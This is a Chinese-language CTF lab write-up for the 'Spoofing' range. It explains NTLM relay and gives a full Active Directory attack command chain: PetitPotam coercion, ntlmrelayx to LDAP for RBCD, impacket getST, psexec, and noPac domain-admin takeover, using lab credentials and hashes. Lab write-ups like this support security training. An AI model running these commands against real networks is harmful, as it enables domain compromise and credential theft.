- 春秋云境 Spoofing

* https://www.cnblogs.com/yokan/p/16102699.html
* https://daiker.gitbook.io/windows-protocol/ntlm-pian
* https://cloud.tencent.com/developer/article/2267322

  NTLM Relay 大体是什么意思呢，其实就是域中的中间人攻击，通过一些方法触发客户端进行认证，将 Net-NTLM Hash 传给我们，我们再带着这个信息去访问 DC，从而实现 Relay。而 NTLM 只是一个底层的认证协议，需要上层协议的支持，比如 smb 也能作为其上层协议，这里是对于 WebDAV(HTTP) 协议进行攻击。需要注意的是不同的协议，其需要的签名状态不同，比如：

relay 到 smb 服务要求被攻击机器不能开启 SMB 签名，普通域内机器默认不是开启的，但是域控是默认开启的。
relay 到 ldap 也要求被攻击机器不开启 ldap 签名，而默认情况下是协商签名，即如果客户端是 smb 协议的话，则默认要求签名，如果是 webadv 或 http 协议，是不要求签名的。

[WriteUp 1](https://fushuling.com/index.php/2023/10/14/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83%C2%B7spoofing/)

- NTLM Relay攻击时在域中通过relay到smb服务将管理组成员冲放到到一些敏感的机器上。
- [因此relay到smb服务要求被攻击机器不能开启SMB签名](https://xz.aliyun.com/t/12627)
- `python RunFinger.py -i 192.168.52.0/24` 检测 Signing: False


```sh
# 检测内网启动了 WebClient 服务的机器：
python cme smb 172.22.11.0/24 -u yangmei -p xrihGHgoNZQ -d xiaorang.lab -M Webdav
# 以及 check PetitPotam 是否能够进行强制触发，这里有对于强制触发的总结。
python cme smb 172.22.11.0/24 -u yangmei -p xrihGHgoNZQ -d xiaorang.lab -M PetitPotam
## 或者下面
proxychains crackmapexec smb 172.22.11.0/24 -u yangmei -p xrihGHgoNZQ -d xiaorang.lab -M Webdav
proxychains crackmapexec smb 172.22.11.0/24 -u yangmei -p xrihGHgoNZQ -d xiaorang.lab -M PetitPotam

## kali连接ssh, 并将201:79转发至本地80端口
kali@192.168.1.123$ ssh -i ~/.ssh/id_rsa root@39.98.115.201 -D 0.0.0.0:1080 -R \*:79:127.0.0.1:80
## socat，让39.x.xx201:80 即 0.0.0.0:80 转发到 127.0.0.1:79，再反向转发回kali的 80 ,变相使 80 监听在 0.0.0.0
root@39.98.115.201$ nohup socat TCP-LISTEN:80,fork,bind=0.0.0.0 TCP:localhost:79 &

## 测试, 有消息回来为正常 39.98.115.201即172.22.11.76
kali$ nc -lvvp 80
kali$ proxychains curl http://172.22.11.76:80

## 攻击, xr-desktop$为前面拿到的机器账户
proxychains python3 ntlmrelayx.py -t ldap://172.22.11.6 --no-dump --no-da --no-acl --escalate-user 'xr-desktop$' --delegate-access
proxychains python3 PetitPotam.py -u yangmei -p 'xrihGHgoNZQ' -d xiaorang.lab ubuntu@80/pwn.txt 172.22.11.26

## 用之前172.22.11.45上抓的机器账户XR-DESKTOP$哈希打172.22.11.26的RBCD
proxychains impacket-getST -spn cifs/XR-LCM3AE8B.xiaorang.lab -impersonate administrator -hashes :6f558f06e563b300dc9f5884aca659f3  xiaorang.lab/XR-Desktop\$ -dc-ip 172.22.11.6
export KRB5CCNAME=administrator.ccache
sudo vim /etc/hosts # 把XR-LCM3AE8B.xiaorang.lab的ip加到hosts里
### 172.22.11.45 XR-Desktop.xiaorang.lab
### 172.22.11.6 xiaorang-dc.xiaorang.lab
### 172.22.11.26 XR-LCM3AE8B.xiaorang.lab

## 最后即可无密码连接
proxychains python3 psexec.py xiaorang.lab/administrator@XR-LCM3AE8B.xiaorang.lab -k -no-pass -target-ip 172.22.11.26 -codec gbk

## 抓到一个zhanghui用户的哈希1232126b24cdf8c9bd2f788a9d7c7ed1，他在MA_Admin组，对computer能够创建对象，能向域中添加机器账户，所以能打noPac
proxychains python3 noPac.py xiaorang.lab/zhanghui -hashes ':1232126b24cdf8c9bd2f788a9d7c7ed1' -dc-ip 172.22.11.6 --impersonate Administrator -create-child -use-ldap -shell
## XR-DESKTOP$也是可以的，毕竟它本来就是机器账户，不用创建了
proxychains python3 noPac.py xiaorang.lab/'XR-DESKTOP$' -hashes ':35fb7e8acb21e4e22703fd8c543e0c25' -dc-ip 172.22.11.6 --impersonate Administrator -no-add -target-name 'XR-DESKTOP$' -old-hash ':35fb7e8acb21e4e22703fd8c543e0c25' -use-ldap -shell

```
